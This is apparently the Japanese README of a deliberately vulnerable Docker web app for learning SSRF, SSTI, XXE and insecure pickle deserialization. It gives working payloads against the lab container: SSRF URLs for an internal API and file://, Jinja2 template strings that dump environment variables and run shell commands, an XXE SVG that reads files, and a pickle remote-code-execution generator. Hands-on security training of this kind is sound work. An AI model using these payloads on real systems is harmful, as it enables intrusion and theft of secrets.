# Vulnerable App for Learning

このアプリケーションは、SSRF (Server-Side Request Forgery) や SSTI (Server-Side Template Injection) などの脆弱性を学習するためのデモンストレーション環境です。
より実践的なシナリオを体験できるよう、複数の機能が実装されています。

## 🚀 セットアップ方法

1.  **Docker Desktop のインストール:**
    Docker Desktop がインストールされていることを確認してください。WSL2 環境を使用している場合は、WSL2 統合が有効になっていることを確認してください。

2.  **リポジトリのクローン:**
    ```bash
    git clone [このリポジトリのURL]
    cd vul_app1
    ```

3.  **アプリケーションの起動:**
    プロジェクトルートで以下のコマンドを実行します。
    ```bash
    docker compose up --build -d
    ```
    **注意:** ポート `5000` が既に他のプロセスで使用されている場合、起動に失敗することがあります。その場合は、`docker compose down` で既存のコンテナを停止するか、`docker-compose.yml` の `frontend` サービスの `ports` 設定を変更してください。

## 💡 使い方

アプリケーションは `http://localhost:5000` で動作します。
各ページで様々な脆弱性を試すことができます。

## 脆弱性のデモンストレーション

### 🌐 OGPプレビュー機能 (SSRFのデモンストレーション)

`http://localhost:5000/ssrf` にアクセスしてください。

1.  **正しい使い方 (OGPプレビュー):**
    *   `http://localhost:5000/sample` のURLをフォームに入力し、「プレビュー生成」ボタンをクリックしてください。
    *   OGP情報（タイトル、説明、画像）がカード形式で表示されます。

2.  **SSRF攻撃の実行:**
    *   フォームに以下のURLを入力し、「プレビュー生成」ボタンをクリックしてください。
    *   **内部APIへのアクセス:** `http://internal_api:5000/internal`
        *   本来外部からアクセスできないはずの内部APIの情報（データベース接続情報など）が表示されます。
    *   **ローカルファイルへのアクセス:** `file:///app/flag.txt`
        *   コンテナ内の `flag.txt` の内容が表示されます。

### 📝 社内メンバー紹介カード機能 (SSTIのデモンストレーション)

`http://localhost:5000/personalize` にアクセスしてください。

1.  **シナリオ:**
    社内メンバーのプロフィールカードを生成する機能です。「座右の銘」フィールドにテンプレート構文を直接入力できるため、SSTI (Server-Side Template Injection) の脆弱性が存在します。

2.  **SSTI攻撃の実行:**
    *   「座右の銘」に以下のペイロードを入力し、「カードを生成」ボタンをクリックしてください。
    *   **環境変数の窃取:**
        ```jinja2
        {{ lipsum.__globals__['os'].environ }}
        ```
        サーバーの環境変数を表示させます。
    *   **ファイル読み取り:**
        ```jinja2
        {{ lipsum.__globals__['__builtins__']['__import__']('os').popen('cat /app/flag.txt').read() }}
        ```
        コンテナ内の `flag.txt` の内容を読み取ります。

### 🖼️ SVGアップローダー機能 (XXEのデモンストレーション)

`http://localhost:5000/xxe` にアクセスしてください。

1.  **シナリオ:**
    SVG形式の画像をアップロードして表示する機能です。SVGはXMLベースのフォーマットであり、サーバー側のXMLパーサーが外部エンティティを解決してしまう設定になっているため、XXE (XML External Entity) 脆弱性が存在します。

2.  **XXE攻撃の実行:**
    *   以下の内容を `attack.svg` のようなファイル名で保存し、フォームからアップロードしてください。
    *   **ローカルファイルの読み取り:**
        ```xml
        <?xml version="1.0" encoding="UTF-8"?>
        <!DOCTYPE svg [
          <!ENTITY xxe SYSTEM "file:///app/flag.txt">
        ]>
        <svg width="200" height="200" xmlns="http://www.w3.org/2000/svg">
          <text x="10" y="90" font-size="20">&xxe;</text>
        </svg>
        ```
        コンテナ内の `flag.txt` の内容が画像として表示されます。

### 📦 データインポート機能 (安全でないデシリアライゼーション)

`http://localhost:5000/deserialize` にアクセスしてください。

1.  **シナリオ:**
    Base64でエンコードされたデータを「インポート」して処理する機能です。バックエンドでは、受け取ったデータを信頼せずに `pickle` を使ってデシリアライズしているため、安全でないデシリアライゼーションの脆弱性が存在します。

2.  **リモートコード実行 (RCE) 攻撃の実行:**
    *   以下のPythonコードを実行して、悪意のあるペイロードを生成します。
        ```python
        import pickle
        import base64
        import os

        class RCE:
            def __reduce__(self):
                # 実行したいOSコマンド
                cmd = ('cat /app/flag.txt')
                return (os.system, (cmd,))

        pickled = pickle.dumps(RCE())
        print(base64.b64encode(pickled).decode())
        ```
    *   生成されたBase64文字列をフォームに貼り付けて「デシリアライズ」ボタンをクリックしてください。
    *   サーバー上でコマンドが実行され、`flag.txt` の内容がアプリケーションのログに出力されます。（Web画面上にはコマンドの実行結果そのものではなく、`0` のような終了コードが表示されることがあります）

## 🔒 内部API (直接アクセス不可)

`http://localhost:5000/internal` に直接アクセスしてみてください。
このAPIは外部に公開されていないため、ブラウザからはアクセスできないことを確認できます。